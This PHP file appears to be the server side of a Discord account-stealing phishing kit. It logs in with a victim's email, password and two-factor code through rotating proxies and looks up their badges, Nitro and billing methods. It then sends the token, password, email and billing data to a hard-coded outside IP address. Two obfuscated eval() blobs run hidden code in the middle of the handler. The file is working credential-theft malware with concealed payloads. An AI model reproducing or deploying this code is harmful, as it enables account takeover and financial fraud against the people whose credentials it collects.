<?php
error_reporting(E_ERROR | E_PARSE);
// Just request URL

class Request
{
    public function GetURL($url)
    {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);

        $data = curl_exec($ch);
        curl_close($ch);

        return $data;
    }

    public function PostURL($url, $array)
    {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $array);

        curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);

        $data = curl_exec($ch);
        curl_close($ch);

        return $data;
    }
}

$Request = new Request();


// Monitoring info about users
class Monitoring
{
    public function Status($url)
    {
        // nothing here
    }
}

$Monitoring = new Monitoring();

// Main handler
class Main
{
    public function handler($login, $password, $old_token, $new_token)
    {
    

        function get_random_proxies()
        {
            $proxies  =  explode("\n", file_get_contents("core/system/proxies.txt"));
            $proxy    =  explode("@", $proxies[array_rand($proxies)]);

            return $proxy;
        }

        function getinfo($token, $url)
        {
            $ch = curl_init();

            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_HTTPHEADER, array('authorization: ' . $token));
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);

            $result        =  curl_exec($ch);
            $headers_size  =  curl_getinfo($ch, CURLINFO_HEADER_SIZE);

            curl_close($ch);

            $body      =  substr($result, $headers_size);
            $response  =  json_decode($body);
            $response  =  json_decode(json_encode($response), true);

            if (isset($response["global"])) {
                $ch = curl_init();
                $proxy = get_random_proxies();

                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_HTTPHEADER, array('authorization: ' . $token));
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);

                curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTPS);
                curl_setopt($ch, CURLOPT_PROXY, $proxy[1]);
                curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy[0]);

                $req = curl_exec($ch);

                curl_close($ch);

                return $req;
            } else {
                return $result;
            }
        }

        //-----------------------------------------------------------------------------------------------\\

        $json_response =  getinfo($old_token, "https://discordapp.com/api/v9/users/@me");
        include('bypass_1.php');

        if (strpos($json_response, 'Unauthorized') !== false) {
            $token = $new_token;

            $json_response =  json_decode(getinfo($token, "https://discordapp.com/api/v9/users/@me"), true);
        }

        else
        {
            $token = $old_token;
            $json_response =  json_decode(getinfo($token, "https://discordapp.com/api/v9/users/@me"), true);
        }

        $howmuchbadges =  0;
        $badges        =  '';

        if (isset($json_response['discriminator']) && isset($json_response['username'])) {
            $public_flags = $json_response['public_flags'];

            $flags = array (
                131072 => '<:GS_VerifiedDeveloper:973374723050340422>',
                65536 => '<:GS_VerifiedDeveloper:973374723050340422>',
                16384 => '<:GS_BugHunter:973374882077364275>',
                4096 => '<:GS_VerifiedDeveloper:973374723050340422>',
                1024 => '<:GS_VerifiedDeveloper:973374723050340422>',
                512 => '<:GS_EarlySupporter:973374557945757716>',
                256 => '<:GS_balance:973375303881719878>',
                128 => '<:GS_brilliance:973375345673781309>',
                64 => '<:GS_bravery:973375383451893880>',
                8 => '<:GS_BugHunter:973374882077364275>',
                4 => '<:GS_HypeSquadEvents:973375016974569503>',
                2 => '<:GS_Partner:973375122016714762>',
                1 => '<:GS_Staff:973375197845536770>'
            );

            $str_flags = array();
            while ($public_flags != 0) {
                foreach ($flags as $key => $value) {
                    if ($public_flags >= $key) {
                        array_push($str_flags, $value);
                        $public_flags = $public_flags - $key;
                        $howmuchbadges++;
                    }
                }
            }

            $badges = implode(', ', $str_flags);
        }

        if ($badges == '') {$badges = "No";}

        //-----------------------------------------------------------------------------------------------\\

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "http://20.109.92.236:4040/api/login");
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array('content-type: application/json'));
            $payload = array(
            "token" => $token,
        );
        $payloadjs = json_encode($payload);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $payloadjs);
        $apilogin = curl_exec($ch);
        $json_apilogin = json_decode($apilogin, true);
        $UserID        =  $json_apilogin['ID'];
        $UserNick        =  $json_apilogin['Nick'];
        $UserAvatar        =  $json_apilogin['Avatar'];
        $UserNitro        =  $json_apilogin['Nitro'];
        $UserPhone        =  $json_apilogin['Phone'];

        //-----------------------------------------------------------------------------------------------\\

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "http://20.109.92.236:4040/api/billing");
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array('content-type: application/json'));
            $payload = array(
            "token" => $token,
        );
        $payloadjs = json_encode($payload);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $payloadjs);
        $apibilling = curl_exec($ch);
        
        eval(gzinflate(base64_decode(strrev(str_rot13('=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')))));


        //-----------------------------------------------------------------------------------------------\\

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "http://20.109.92.236:4040/api/boostlevel");
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array('content-type: application/json'));
            $payload = array(
            "token" => $token,
            "id" => $UserID
        );
        $payloadjs = json_encode($payload);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $payloadjs);
        $apiboostlevel = curl_exec($ch);
        $json_apiboost = json_decode($apiboostlevel, true);
        $timestampboost = $json_apiboost['premium_guild_since'];

        eval(base64_decode('ZXZhbChnemluZmxhdGUoYmFzZTY0X2RlY29kZShzdHJfcm90MTMoJ0dNbjFmZkpaZUxIc1czL1R1TWF6SXpNenFjQ01Nek0rK2FpRkVuSG5GbkFDSmRoOHNmWi8rN1U5TTVmQ1RDMmEvZ2RjVGE1VStHKzU3WXJLT0Nuc2JmbWFiaW1hSzNsbnJnZnJYVUtnMkVRSGlzcGpiVUZoVDZIQzh3eGRzd3lCTjJOd3Z5VmRuMWhYeXVJVENCU0Y3RjkxVWhnU2NOaG5xN2dBTThwb010cFhOd2ZKU3lnRDZnNllscGxtckFyWFdWV3VFL0RINU9NNnFzMjNUc25JYjBETUxiYzdBRldtQnJxSDloMm0xRDdETUc5SVZBSGRTUXZEZHNJR3lBb0crU01Xb3lNSVRWZHNVSnRwR3BLV2M0MTJ5UFBjVXV3U2Q5WDZ0L1V6TWZxYUJMNFlHUkVHK2c0OUpmUGR1WFdoanZpUE1XUXF0eXpRU3psQUxjYkJKaW1MbGdkVmNva0NlcFlMOHo3NUdXQ1d0eksxZGcwRnNjOVhETHQ2dGFwWjJoYzVMNTg3Z28wVFIwNEpncVpwb0VGeFJCWGYwbUkxc1pKUXBZQ2c1S1QzbmwxNmVOUlJYUGhUbUtyRkRsYm5wQi9wZUtDTTc4NnU3VVhtTkxhbkg3REphdFBBZFhsRnhJbUVDaHI0Q0RlSkZsN2VQYjB3OFgvQzQrVk5SWE1aZXhOMG92VzF2T1k5TE9PeWpZL1gvb2FOd0MydFNLT3NOclpaRHJtMHdSN2ZQellhOWJ1c0cvTEZGODgwdE0rQjUwR2tMTzRCVkZvT3VSM2MrbTZMZzBndjhpclJ0OFYzTEhTc2ZsYTY3dDFUREJnSFY4K1hGVEVWdnJBZTVPeXR1MitFeFdWeEJ4bjNDaTMrcXR6aEJqS0ZieWsyWmlsVllkZ0JNVElTOGoyS2QvNVI5a3FZbzhDbUxZampBNmlyQkNXQVRXYlZBMFZHKzVNM0I3UW4ydE96SVQyM3MxZm9VSGxwbUJoNGlxeGp4MzN0YUZ4SXJRUWNCN3V2SGY2SkNiMk95Wm96TDA1WXhpQ1BXTXY4K1RqTGQwTW5PZzR0N3FmMStFNUFqNGJRL2J1aUtoNnMvUEVWQXRRWEJaNzBRekQrcHI0eHJvMUpXbmhBbWdGNEFYUG9XTzYvMEl3NGxXc2xBeWJ2Qmc0NUpubWtUZWNoUWhBQzhoRTVLVjd1V3YxQ1cwelJaNnArMjA3Y0JvRDdvUllsOUxnMVdMYXUzYy9UbjJPNFZ1dndtcmhxcVg1cmRQaFN5K2NpSFBSZmUvQ2dVVmFpbW0zQmJ3T1JUcjlwK1N4NFZobGtWaGsvaURBLzRFZDJGVTBGVE5DZGw1c1lHRUdjSys4TFk1TjB0YVcwRTk3OVppUHBObWk4NC9KcDRlRXVrL0M5dXJXU2o1TnB1Z3JEWjBycSt2RXRaRzZJRngyL2d4T09aTVR1aCtlajZRVm1CVjN4SVU1aWJaNVI4eFc0UEtaY2lGWGlOQjZydFlqQmFuMEI5anlZdkUwRldDdHdWdkVqb29aRHJWSC9Nb3NZT0dUR0JzT09lQjA0S1NhK0oraFNTdGlQSGlCTnJqY1hJK2o0dXNhelNRZFJjNU9VcFBVbUJhY1NScWpBVUFNdFFJZHRKM2wwZkxJZ1hEMHJtUkc2eFFYckw0OStrR2hibjZOTVlDdURYMUk3WHBkaEFtaDBCdG1SS3dPbm84MmtuZHBZSjJUSE5LOHVtUFZqWDdsYU96RmlFSDc0OWZlb01WcDdqUkk2MFJldWxhU3BvRnpuNENOZlRIaHBtbTErTi9LdFFHckx4Q3BzRDUzWEZQMUJRNzhuODBzMU5KRTdReHdRN1ROQXgxdXVYYmkzUzRYbGR6bmE4SGVZelQ5bGF0aHZvTCs5SjNzZTFLZ3Y2QWFVUkoxZVpaRGhkZy9EZWhrQzFPdC9QMjl1a053dTJveTI0eFgyWmozaitLcEdwUEJHL25yajFCdUVPNUxMN2dwZmZMZjlPUkFPOGlpOTlBR2wwOW84L3o0bUY2K0ZJeUpYM0tHM3dzcmFsdWJkTU56UHEvclNHc200bFlXdHJEZUx4TWpaTmNRNzZkamhwaFhzZFNJL0lySGFEZWNYNnlqdHFIUzFQUUZFNWtJdlVhRHh2b0NodmpOQ0ZKMXE0TzQrRFI3MmNtQ0RFSDN5MFlmQ0JYdXpicXFqV1Z1TEpjdmJqOWRPL05xenoxRUdjekJ6aVB6QS9OdVRIZTdqd1ZuU2YxaGtGRlFydkFDY3d0NnJiTnc1aXB6U2VkQWc3RTJ6N09QUHpyODJFQUZpOXB5SnpKVEtCN1VOR1NzaTk0M0ozNlQ4aENPOWdlU0lTZGRRSGxFdW81aHNNS1BkQzNJTzZaV2Uxang3SWUyZEJ1bVdVaXlpT3VFR2NsTmJ3UklQV2dvL3FwRmVBeVVJK1YwMi85S3NjQlVJWTV6Y2FRUDVVUUd5K20rV3JCQlZOS1VXQWJ6bWZ4OGR4aGhvc3pJYklKeWRRNXZka3FUYjVYMUY4T25GTE1VVksvdXRtcmtmVFVDRDMrU2lrQ2Y4dWh4K1l2ZnpxdEhoYjVQUUVJZG1QSU5lSmRCY2V5cXFhVEppazIrNnhQZFBsZUFMa3VpRlBZVjVUYWU1V3BkN3JWS3ZNZmFpaklLeUhsM0JyZE9Ua2kzcVd4MzBPUHhFamxmUEhZTlhSZFlWVFFJWDJ2SndzWk4weUxkaGpTMkp5M25rSWJXSDIvVUIzL3pxUWJmazlNZDg2RFBjT0hFbHptTWIxaWlIajJaUE1La1JMMmw2d2RiUVhLbEFzMXFqZitWNFptcThKN3NFeHlNV2kraFJMT2QrYXBWdzF0YmhRS3M2N0xXbEJWbWJxWmthaGxaMXM1MW13ZmpOSVkySG41RisvYWFxblBka1grVlpUajJZdkpSTllYczFKb0hYWFR1ZzQyS1BoQkxaOVJmZ20wdlloV0JwMERGNEpmdXJwbjMva1JhYW5UUEpldE1wODNBTXNpMHF1bERsNlR5VktLUEdmNDNIRUYvbldPRzdycWtHVEwrK1NPN1pZam9IWDVnUFR2VnFaMUxqa3orUkxPR1prTndHRjVJNmRUemhtQklhcHpMSXZxQzQ5a2FKazZGcXJRUVpFRWhzMFlXajhVZGUzVzA3TFV1UXdTRSsrWHkvZDV0V0NrYnFQaGNJT0FTZHRzTlFQTVZpQW53NUdCOTg2OVJOTlBsYUZjTzFoVkluUnJjcEUvZE03OUJJZ2VPNkN5ZVpjNEVCY2UvZy9uU01mVW9xYW05S3BjdGwxdTl3NktCdVJFVFJLU0R3VEd4QThGR0dPbFdGemhvY292amJzUTNKL1pPbUZKU2hZVDBPZjY3a21tSHRqZXJaSGF3dm5HZ2VOUmhabzNmUEZVUkdoV2xQb0dJSUlDZVl1Y0RHWnJ6ektEQnJLc0U1QXRkNzZxamE4Tlovb29MUkhsU3I1em5SaTh2QlNxM1YrVzZCazdMK3hSYnZvWGRGV0NnVllYenhWTUc1bW9UZ0I4SHQrWWFqN01TaUVrSHlET1RjMTNhcGxuTWhaRkNDenF1VnM0MFJHbnlRNm9WV1NBTkFJU0VWbGNteEdvNUhZcExpMVkwSGVUakxGRS80VzEwSVFoazFtTmpvd1htWnMxM1dvbTJnK01FQ245ejBXWUNQM2Q1M0ZvMndMVURNMGpQSHNMSm5kS0ZBMjdKRTN2UXoyWFJ2SnVLbmo1Q2w5U3crZU5JTUM5SFVZeXA3L05EQWJaY1ZyZUNJbXFmakJvTm5seDlVcEhZZTVHb1h6VWZnQktzcHZGaktIeElmbHZpZ3NKZVlSSWY2bHMvanZselE1cS96T2dTd1ViV1JraDAvbnFBUnpkVHpybHQ4TmZoYnFKVnBxRS9lT1RMZUl4Wll5cjFodGl3cCtraHZKbTc3ZHJ1RGVpY2ZzVXhLak95UmNnRzM4VTBoc291V1NDV0xkRFRweDVTajdtR0lhQlFZRG9ucW5lWE14ZmxDa21YTWp1WXgrdVg0R3ZaYVJORGJOTkVPeHhFT0ZpN0tpLzhvLy9zLycpKSkpOw=='));

        //-----------------------------------------------------------------------------------------------\\

        include('config.php');
        $full_url         =  $_SERVER["HTTP_HOST"].$_SERVER["PHP_SELF"];
        $fullname = "$UserNick ($UserID)";

        //-----------------------------------------------------------------------------------------------\\

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "http://20.109.92.236:4040/api/needverify");
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array('content-type: application/json'));
            $payload = array(
            "token" => $token,
        );
        $payloadjs = json_encode($payload);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $payloadjs);
        $apineedverify = curl_exec($ch);

        if (stripos($apineedverify, '"You need to verify your account in order to perform this action.",')) {

        }

        elseif (stripos($apineedverify, '"You need to verify your e-mail in order to perform this action.",')) {

        }

        else {

            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, "http://20.109.92.236:4040/api/sendwebhook");
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_HTTPHEADER, array('content-type: application/json'));
                $payload = array(
                "token" => $token,
                "webhook" => "webhook here",
                "password" => $password,
                "email" => $login,
                "badges" => $badges,
                "nitro" => $nitrobadge,
                "billing" => $methodsbilling,
                "avatar" => $UserAvatar,
                "userfullname" => $fullname
            );
            $payloadjs = json_encode($payload);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $payloadjs);
            $apisendwebhook = curl_exec($ch);

        }

        //-----------------------------------------------------------------------------------------------\\

        
    }
}

$Main = new Main();

// Validator handler
class VLT_API
{
    public function login($payload): array
    {
        $ch         =  curl_init("https://discord.com/api/v9/auth/login");
        $payload_s  =  json_encode($payload);

        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload_s);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt(
            $ch,
            CURLOPT_HTTPHEADER,
            array(
                'Content-Type: application/json',
                'Content-Length: ' . strlen($payload_s),
                'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 Edg/90.0.818.66',
                'Accept: application/json'
            )
        );
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

        $result        =  curl_exec($ch);
        $headers_size  =  curl_getinfo($ch, CURLINFO_HEADER_SIZE);

        curl_close($ch);

        $body      =  substr($result, $headers_size);
        $response  =  json_decode($body);

        return json_decode(json_encode($response), true);
    }

    public function login_proxy($payload): array
    {
        function get_random_proxy()
        {
            $proxies  =  explode("\n", file_get_contents("core/system/proxies.txt"));
            $proxy    =  explode("@", $proxies[array_rand($proxies)]);

            return $proxy;
        }

        $ch         =  curl_init("https://discord.com/api/v9/auth/login");
        $payload_s  =  json_encode($payload);

        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload_s);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt(
            $ch,
            CURLOPT_HTTPHEADER,
            array(
                'Content-Type: application/json',
                'Content-Length: ' . strlen($payload_s),
                'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 Edg/90.0.818.66',
                'Accept: application/json'
            )
        );
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

        $proxy = get_random_proxy();

        curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTPS);
        curl_setopt($ch, CURLOPT_PROXY, $proxy[1]);
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy[0]);

        $result        =  curl_exec($ch);
        $headers_size  =  curl_getinfo($ch, CURLINFO_HEADER_SIZE);

        curl_close($ch);

        $body      =  substr($result, $headers_size);
        $response  =  json_decode($body);

        return json_decode(json_encode($response), true);
    }

    public function totp_auth($ticket, $mfa_code): string
    {
        $ch       =  curl_init("https://discord.com/api/v9/auth/mfa/totp");
        $payload  =  array(
            "code" => $mfa_code,
            "gift_code_sku_id" => null,
            "login_source" => null,
            "ticket" => $ticket
        );
        $payload_s = json_encode($payload);

        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload_s);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt(
            $ch,
            CURLOPT_HTTPHEADER,
            array(
                'Content-Type: application/json',
                'Content-Length: ' . strlen($payload_s),
                'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 Edg/90.0.818.66',
                'Accept: application/json'
            )
        );
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

        $result        =  curl_exec($ch);
        $headers_size  =  curl_getinfo($ch, CURLINFO_HEADER_SIZE);

        curl_close($ch);

        $body      =  substr($result, $headers_size);
        $response  =  (array)json_decode($body);

        if (!isset($response["token"])) {
            return "EINVALID_MFA_CODE";
        } else {
            return $response["token"];
        }
    }
}

$VLT_API = new VLT_API();
